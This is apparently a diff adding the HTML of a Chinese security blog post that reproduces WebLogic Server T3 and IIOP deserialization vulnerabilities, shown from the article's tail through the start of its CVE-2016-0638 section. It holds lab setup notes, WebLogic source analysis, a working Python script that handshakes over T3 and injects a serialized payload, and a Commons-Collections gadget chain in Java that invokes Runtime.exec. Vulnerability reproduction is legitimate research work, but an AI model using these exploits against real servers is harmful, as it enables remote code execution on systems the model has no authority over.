deserialize方法就是java原生反序列化，lookup一个Reference并指定工厂类即可。\n可以参考weblogic.management.mbeanservers.partition.PartitionedMbsRefObjFactory#createReference的代码写。需要注意的是PartitionedMbsRefObjFactory是抽象类，要找一个实现类比如PartitionedDomainRuntimeMbsRefObjFactory\n生成Reference:\nStringRefAddr addr = new StringRefAddr(\"partitionName\", \"asas\"); Reference reference = new Reference(MBeanServer.class.getName(), addr, PartitionedDomainRuntimeMbsRefObjFactory.class.getName(), (String)null); RefAddr jvmIdAddr = new BinaryRefAddr(\"jvmId\", getEvilData()); reference.add(jvmIdAddr); 12.2.1.4版本的CC为3.2.2版本，CC链不能利用了。\n参考 http://drops.xmd5.com/static/drops/web-13470.html\nhttps://boogipop.com/2023/04/26/Weblogic%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/\nhttps://github.com/Y4er/CVE-2020-2551\nhttps://l3yx.github.io/2020/04/22/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/\nhttps://xz.aliyun.com/news/7094\nhttps://mp.weixin.qq.com/s/Mh9BDkKP79BPEYdAt5uhaw\nhttps://xz.aliyun.com/news/13742\nhttps://xz.aliyun.com/news/14609\n",
+  "wordCount" : "2001",
+  "inLanguage": "en",
+  "datePublished": "2025-02-23T13:51:20Z",
+  "dateModified": "2025-02-23T13:51:20Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://zoiltin.github.io/posts/weblogic-server%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "zoiltin's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://zoiltin.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://zoiltin.github.io/" accesskey="h" title="zoiltin&#39;s Blog (Alt + H)">zoiltin&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://zoiltin.github.io/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zoiltin.github.io/search" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zoiltin.github.io/posts" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zoiltin.github.io/about" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Weblogic Server系列漏洞复现
+    </h1>
+    <div class="post-description">
+      复现了Weblogic Server关于T3/IIOP的一系列反序列化漏洞
+    </div>
+    <div class="post-meta"><span title='2025-02-23 13:51:20 +0000 UTC'>February 23, 2025</span>&nbsp;·&nbsp;10 min
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#%e7%8e%af%e5%a2%83%e9%85%8d%e7%bd%ae" aria-label="环境配置">环境配置</a></li>
+                <li>
+                    <a href="#t3%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" aria-label="T3反序列化">T3反序列化</a><ul>
+                        
+                <li>
+                    <a href="#cve-2015-4852" aria-label="CVE-2015-4852">CVE-2015-4852</a></li>
+                <li>
+                    <a href="#cve-2016-0638-readexternal%e7%bb%95%e8%bf%87" aria-label="CVE-2016-0638 (readExternal绕过)">CVE-2016-0638 (readExternal绕过)</a></li>
+                <li>
+                    <a href="#cve-2016-3510-readresolve%e7%bb%95%e8%bf%87" aria-label="CVE-2016-3510 (readResolve绕过)">CVE-2016-3510 (readResolve绕过)</a></li>
+                <li>
+                    <a href="#cve-2017-3248" aria-label="CVE-2017-3248">CVE-2017-3248</a></li>
+                <li>
+                    <a href="#cve-2018-2628" aria-label="CVE-2018-2628">CVE-2018-2628</a></li></ul>
+                </li>
+                <li>
+                    <a href="#iiop%e5%8d%8f%e8%ae%ae%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" aria-label="IIOP协议反序列化">IIOP协议反序列化</a><ul>
+                        
+                <li>
+                    <a href="#%e7%bd%91%e8%b7%af%e9%97%ae%e9%a2%98" aria-label="网路问题">网路问题</a></li>
+                <li>
+                    <a href="#cve-2020-2551" aria-label="CVE-2020-2551">CVE-2020-2551</a></li>
+                <li>
+                    <a href="#cve-2023-21839" aria-label="CVE-2023-21839">CVE-2023-21839</a></li>
+                <li>
+                    <a href="#cve-2024-20931" aria-label="CVE-2024-20931">CVE-2024-20931</a></li>
+                <li>
+                    <a href="#cve-2024-21006" aria-label="CVE-2024-21006">CVE-2024-21006</a></li>
+                <li>
+                    <a href="#cve-2024-21181" aria-label="CVE-2024-21181">CVE-2024-21181</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e5%8f%82%e8%80%83" aria-label="参考">参考</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="环境配置">环境配置<a hidden class="anchor" aria-hidden="true" href="#环境配置">#</a></h1>
+<p>使用WeblogicEnvironment项目搭建，地址：<a href="https://github.com/QAX-A-Team/WeblogicEnvironment">WeblogicEnvironment</a></p>
+<p>Weblogic Server官网下载地址：https://www.oracle.com/hk/middleware/technologies/weblogic-server-downloads.html</p>
+<p>oracle删除了官网上所有的Weblogic Server 10.3.6.0.0的下载链接，只剩下了12.x和14.x的。不过我们可以通过url直接下载：http://download.oracle.com/otn/nt/middleware/11g/wls/1036/wls1036_generic.jar</p>
+<p>docker build或者run的时候可能会内存不足，增加ulimit即可：<code>--ulimit nofile=65535:65535</code></p>
+<p>docker里的java版本最好和idea使用的版本一样，不然容易出现debug行号不一致的问题。</p>
+<p>由于centos 8 于2021年12月31日停止了源的服务，需要修改yum的源等等操作，修改Dockerfile:</p>
+<pre tabindex="0"><code>RUN cd /etc/yum.repos.d/
+RUN sed -i &#39;s/mirrorlist/#mirrorlist/g&#39; /etc/yum.repos.d/CentOS-*
+RUN sed -i &#39;s|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g&#39; /etc/yum.repos.d/CentOS-*
+</code></pre><p>从容器里复制出lib导入idea即可开始debug，端口以为8453：</p>
+<pre tabindex="0"><code>/u01/app/oracle/middleware/modules 
+/u01/app/oracle/middleware/wlserver
+/u01/app/oracle/middleware/coherence_3.7/lib
+</code></pre><h1 id="t3反序列化">T3反序列化<a hidden class="anchor" aria-hidden="true" href="#t3反序列化">#</a></h1>
+<h2 id="cve-2015-4852">CVE-2015-4852<a hidden class="anchor" aria-hidden="true" href="#cve-2015-4852">#</a></h2>
+<blockquote>
+<p>Weblogic 10.3.6</p>
+<p>JDK8u65</p>
+</blockquote>
+<p>T3协议部分参考：http://drops.xmd5.com/static/drops/web-13470.html</p>
+<p>Weblogic Server 使用T3协议进行RMI通信，请求包格式如下：
+<img alt="1" loading="lazy" src="/posts/weblogic-server%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/1.jpg"></p>
+<p>第一部分为T3协议头，后面跟着7段java序列化数据，将其中任意一部分改为恶意序列化数据即可。</p>
+<p>关于其中探测版本部分，我发现有时返回包会分到两个TCP数据包里发过来，所以脚本需要改一下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>data <span style="color:#f92672">=</span> sock<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(data) <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span>:
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> data <span style="color:#f92672">+</span> sock<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span></code></pre></div><p>数据流先进入<code>InboundMsgAbbrev#readObject</code>方法：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> Object <span style="color:#a6e22e">readObject</span>(MsgAbbrevInputStream var1) <span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> var2 <span style="color:#f92672">=</span> var1.<span style="color:#a6e22e">read</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> (var2) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> 0:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">new</span> ServerChannelInputStream(var1)).<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> 1:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> var1.<span style="color:#a6e22e">readASCII</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">default</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> StreamCorruptedException(<span style="color:#e6db74">&#34;Unknown typecode: &#39;&#34;</span> <span style="color:#f92672">+</span> var2 <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>然后进入<code>ServerChannelInputStream#readObject</code>方法，这个类实现了<code>resolveClass</code>方法：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> Class <span style="color:#a6e22e">resolveClass</span>(ObjectStreamClass var1) <span style="color:#66d9ef">throws</span> ClassNotFoundException, IOException {
+</span></span><span style="display:flex;"><span>    Class var2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">super</span>.<span style="color:#a6e22e">resolveClass</span>(var1);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (var2 <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> ClassNotFoundException(<span style="color:#e6db74">&#34;super.resolveClass returns null.&#34;</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        ObjectStreamClass var3 <span style="color:#f92672">=</span> ObjectStreamClass.<span style="color:#a6e22e">lookup</span>(var2);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (var3 <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> var3.<span style="color:#a6e22e">getSerialVersionUID</span>() <span style="color:#f92672">!=</span> var1.<span style="color:#a6e22e">getSerialVersionUID</span>()) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> ClassNotFoundException(<span style="color:#e6db74">&#34;different serialVersionUID. local: &#34;</span> <span style="color:#f92672">+</span> var3.<span style="color:#a6e22e">getSerialVersionUID</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; remote: &#34;</span> <span style="color:#f92672">+</span> var1.<span style="color:#a6e22e">getSerialVersionUID</span>());
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> var2;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>不过这个版本没有过滤，不影响。<code>ServerChannelInputStream</code>没有重写<code>readObject</code>，所以直接进入<code>java.io.ObjectInputStream#readObject</code>方法。畅通无阻。</p>
+<p>10.3.6版本带有cc3.2.0的依赖，可以打cc链，exp如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> binascii
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_payload</span>(path):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(path, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exp</span>(host, port, payload):
+</span></span><span style="display:flex;"><span>    sock <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>    sock<span style="color:#f92672">.</span>connect((host, port))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    handshake <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;t3 12.2.3</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">AS:255</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">HL:19</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">MS:10000000</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode()
+</span></span><span style="display:flex;"><span>    sock<span style="color:#f92672">.</span>sendall(handshake)
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> sock<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(data) <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span>:
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> data <span style="color:#f92672">+</span> sock<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>    pattern <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>compile(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;HELO:(.*).false&#34;</span>)
+</span></span><span style="display:flex;"><span>    version <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(pattern, data<span style="color:#f92672">.</span>decode())
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(version) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Not Weblogic&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Weblogic </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(version[<span style="color:#ae81ff">0</span>]))
+</span></span><span style="display:flex;"><span>    data_len <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>a2b_hex(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;00000000&#34;</span>) <span style="color:#75715e">#数据包长度，先占位，后面会根据实际情况重新</span>
+</span></span><span style="display:flex;"><span>    t3header <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>a2b_hex(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&#34;</span>) <span style="color:#75715e">#t3协议头</span>
+</span></span><span style="display:flex;"><span>    flag <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>a2b_hex(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;fe010000&#34;</span>) <span style="color:#75715e">#反序列化数据标志</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> data_len <span style="color:#f92672">+</span> t3header <span style="color:#f92672">+</span> flag <span style="color:#f92672">+</span> payload
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&gt;I&#39;</span>, len(payload)) <span style="color:#f92672">+</span> payload[<span style="color:#ae81ff">4</span>:] <span style="color:#75715e">#重新计算数据包长度</span>
+</span></span><span style="display:flex;"><span>    sock<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    port <span style="color:#f92672">=</span> <span style="color:#ae81ff">7001</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> get_payload(<span style="color:#e6db74">&#34;./ser.bin&#34;</span>)
+</span></span><span style="display:flex;"><span>    exp(host, port, payload)
+</span></span></code></pre></div><p>生成的恶意序列化放在<code>./ser.bin</code>。生成代码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Exp</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        String command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> String<span style="color:#f92672">[]</span> execArgs <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span> { command };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> Transformer<span style="color:#f92672">[]</span> transformers <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> ConstantTransformer(Runtime.<span style="color:#a6e22e">class</span>),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;getMethod&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span> {
+</span></span><span style="display:flex;"><span>                        String.<span style="color:#a6e22e">class</span>, Class<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span> }, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span> {
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;getRuntime&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span> }),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;invoke&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span> {
+</span></span><span style="display:flex;"><span>                        Object.<span style="color:#a6e22e">class</span>, Object<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span> }, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span> {
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span> }),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;exec&#34;</span>,
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span> { String.<span style="color:#a6e22e">class</span> }, execArgs),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> ConstantTransformer(1) };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Transformer transformerChain <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer(transformers);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> Map innerMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> Map lazyMap <span style="color:#f92672">=</span> LazyMap.<span style="color:#a6e22e">decorate</span>(innerMap, transformerChain);
+</span></span><span style="display:flex;"><span>        TiedMapEntry entry <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TiedMapEntry(lazyMap, <span style="color:#e6db74">&#34;foo&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        HashSet map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashSet(1);
+</span></span><span style="display:flex;"><span>        map.<span style="color:#a6e22e">add</span>(<span style="color:#e6db74">&#34;foo&#34;</span>);
+</span></span><span style="display:flex;"><span>        HashMap innimpl <span style="color:#f92672">=</span> (HashMap) getFieldValue(map, <span style="color:#e6db74">&#34;map&#34;</span>);
+</span></span><span style="display:flex;"><span>        Object<span style="color:#f92672">[]</span> array <span style="color:#f92672">=</span> (Object<span style="color:#f92672">[]</span>) getFieldValue(innimpl, <span style="color:#e6db74">&#34;table&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Object node <span style="color:#f92672">=</span> array<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(node <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>){
+</span></span><span style="display:flex;"><span>            node <span style="color:#f92672">=</span> array<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        setFieldValue(node, <span style="color:#e6db74">&#34;key&#34;</span>, entry);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        serToFile(map);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="cve-2016-0638-readexternal绕过">CVE-2016-0638 (readExternal绕过)<a hidden class="anchor" aria-hidden="true" href="#cve-2016-0638-readexternal绕过">#</a></h2>
+<blockquote>
+<p>Weblogic 10.3.6</p>
+<p>JDK8u65</p>
+</blockquote>
+<p><code>CVE-2015-4852</code>的补丁就是在<code>resolveclass</code>里添加类黑名单检测，绕过思路就是二次反序列化。</p>
+<p><code>java.io.ObjectInputStream#readObject</code>会调用<code>readOrdinaryObject</code>方法反序列化为<code>Object</code>，其中如果可拓展会调用<code>readExternalData</code>方法：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> Object <span style="color:#a6e22e">readOrdinaryObject</span>(<span style="color:#66d9ef">boolean</span> unshared)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">throws</span> IOException
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (bin.<span style="color:#a6e22e">readByte</span>() <span style="color:#f92672">!=</span> TC_OBJECT) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> InternalError();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ObjectStreamClass desc <span style="color:#f92672">=</span> readClassDesc(<span style="color:#66d9ef">false</span>);
+</span></span><span style="display:flex;"><span>    desc.<span style="color:#a6e22e">checkDeserialize</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ................
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (desc.<span style="color:#a6e22e">isExternalizable</span>()) {
+</span></span><span style="display:flex;"><span>        readExternalData((Externalizable) obj, desc);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        readSerialData(obj, desc);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    .................
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> obj;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>最终会调用这个<code>Externalizable</code>类的<code>readExternal</code>方法。</p>
+<p><code>StreamMessageImpl</code>类的<code>readExternal</code>方法代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readExternal</span>(ObjectInput var1) <span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">super</span>.<span style="color:#a6e22e">readExternal</span>(var1);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">byte</span> var2 <span style="color:#f92672">=</span> var1.<span style="color:#a6e22e">readByte</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">byte</span> var3 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">byte</span>)(var2 <span style="color:#f92672">&amp;</span> 127);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (var3 <span style="color:#f92672">&gt;=</span> 1 <span style="color:#f92672">&amp;&amp;</span> var3 <span style="color:#f92672">&lt;=</span> 3) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">switch</span> (var3) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> 1:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> (PayloadStream)PayloadFactoryImpl.<span style="color:#a6e22e">createPayload</span>((InputStream)var1);
+</span></span><span style="display:flex;"><span>                BufferInputStream var4 <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">payload</span>.<span style="color:#a6e22e">getInputStream</span>();
+</span></span><span style="display:flex;"><span>                ObjectInputStream var5 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(var4);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">setBodyWritable</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">setPropertiesWritable</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">try</span> {
